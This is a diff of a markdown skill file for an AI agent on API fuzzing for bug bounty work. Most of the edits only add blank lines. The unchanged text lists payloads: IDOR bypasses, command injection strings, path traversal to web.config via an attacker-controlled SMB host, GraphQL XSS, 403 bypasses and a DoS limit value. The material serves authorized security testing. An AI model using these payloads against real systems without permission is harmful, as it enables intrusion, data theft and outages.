@@ -8,7 +8,6 @@ id: skill-api-fuzzing-bug-bounty
 owner: [[eng-api]]
 ---
 
-
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # API Fuzzing for Bug Bounty
@@ -52,7 +51,9 @@ Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during
 Identify API type and enumerate endpoints:
 
 ```bash
+
 # Check for Swagger/OpenAPI documentation
+
 /swagger.json
 /openapi.json
 /api-docs
@@ -60,26 +61,33 @@ Identify API type and enumerate endpoints:
 /swagger-ui.html
 
 # Use Kiterunner for API discovery
+
 kr scan https://target.com -w routes-large.kite
 
 # Extract paths from Swagger
+
 python3 json2paths.py swagger.json
 ```
 
 ### Step 2: Authentication Testing
 
 ```bash
+
 # Test different login paths
+
 /api/mobile/login
 /api/v3/login
 /api/magic_link
 /api/admin/login
 
 # Check rate limiting on auth endpoints
+
 # If no rate limit → brute force possible
 
 # Test mobile vs web API separately
+
 # Don't assume same security controls
+
 ```
 
 ### Step 3: IDOR Testing
@@ -87,31 +95,41 @@ python3 json2paths.py swagger.json
 Insecure Direct Object Reference is the most common API vulnerability:
 
 ```bash
+
 # Basic IDOR
+
 GET /api/users/1234 → GET /api/users/1235
 
 # Even if ID is email-based, try numeric
+
 /?user_id=111 instead of /?user_id=user@mail.com
 
 # Test /me/orders vs /user/654321/orders
+
 ```
 
 **IDOR Bypass Techniques:**
 
 ```bash
+
 # Wrap ID in array
+
 {"id":111} → {"id":[111]}
 
 # JSON wrap
+
 {"id":111} → {"id":{"id":111}}
 
 # Send ID twice
+
 URL?id=<LEGIT>&id=<VICTIM>
 
 # Wildcard injection
+
 {"user_id":"*"}
 
 # Parameter pollution
+
 /api/get_profile?user_id=<victim>&user_id=<legit>
 {"user_id":<legit_id>,"user_id":<victim_id>}
 ```
@@ -131,10 +149,13 @@ URL?id=<LEGIT>&id=<VICTIM>
 **Command Injection:**
 
 ```bash
+
 # Ruby on Rails
+
 ?url=Kernel#open → ?url=|ls
 
 # Linux command injection
+
 api.url.com/endpoint?name=file.txt;ls%20/
 ```
 
@@ -154,8 +175,11 @@ api.url.com/endpoint?name=file.txt;ls%20/
 **.NET Path.Combine Vulnerability:**
 
 ```bash
+
 # If .NET app uses Path.Combine(path_1, path_2)
+
 # Test for path traversal
+
 https://example.org/download?filename=a.png
 https://example.org/download?filename=C:\inetpub\wwwroot\web.config
 https://example.org/download?filename=\\smb.dns.attacker.com\a.png
@@ -164,7 +188,9 @@ https://example.org/download?filename=\\smb.dns.attacker.com\a.png
 ### Step 5: Method Testing
 
 ```bash
+
 # Test all HTTP methods
+
 GET /api/v1/users/1
 POST /api/v1/users/1
 PUT /api/v1/users/1
@@ -172,6 +198,7 @@ DELETE /api/v1/users/1
 PATCH /api/v1/users/1
 
 # Switch content type
+
 Content-Type: application/json → application/xml
 ```
 
@@ -196,7 +223,9 @@ Fetch entire backend schema:
 ### GraphQL IDOR
 
 ```graphql
+
 # Try accessing other user IDs
+
 query {
   user(id: "OTHER_USER_ID") {
     email
@@ -251,10 +280,13 @@ query {
 ### GraphQL XSS
 
 ```bash
+
 # XSS via GraphQL endpoint
+
 http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
 
 # URL-encoded XSS
+
 http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
 ```
 
@@ -275,10 +307,13 @@ http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
 When receiving 403/401, try these bypasses:
 
 ```bash
+
 # Original blocked request
+
 /api/v1/users/sensitivedata → 403
 
 # Bypass attempts
+
 /api/v1/users/sensitivedata.json
 /api/v1/users/sensitivedata?
 /api/v1/users/sensitivedata/
@@ -313,10 +348,13 @@ When receiving 403/401, try these bypasses:
 ### DoS via Limits
 
 ```bash
+
 # Normal request
+
 /api/news?limit=100
 
 # DoS attempt
+
 /api/news?limit=9999999999
 ```
 
@@ -385,16 +423,19 @@ When receiving 403/401, try these bypasses:
 ## Constraints
 
 **Must:**
+
 - Test mobile, web, and developer APIs separately
 - Check all API versions (/v1, /v2, /v3)
 - Validate both authenticated and unauthenticated access
 
 **Must Not:**
+
 - Assume same security controls across API versions
 - Skip testing undocumented endpoints
 - Ignore rate limiting checks
 
 **Should:**
+
 - Add `X-Requested-With: XMLHttpRequest` header to simulate frontend
 - Check archive.org for historical API endpoints
 - Test for race conditions on sensitive operations
@@ -406,15 +447,19 @@ When receiving 403/401, try these bypasses:
 ### Example 1: IDOR Exploitation
 
 ```bash
+
 # Original request (own data)
+
 GET /api/v1/invoices/12345
 Authorization: Bearer <token>
 
 # Modified request (other user's data)
+
 GET /api/v1/invoices/12346
 Authorization: Bearer <token>
 
 # Response reveals other user's invoice data
+
 ```
 
 ### Example 2: GraphQL Introspection
@@ -438,9 +483,11 @@ curl -X POST https://target.com/graphql \
 | Can't find endpoints | Check Swagger, archive.org, JS files |
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
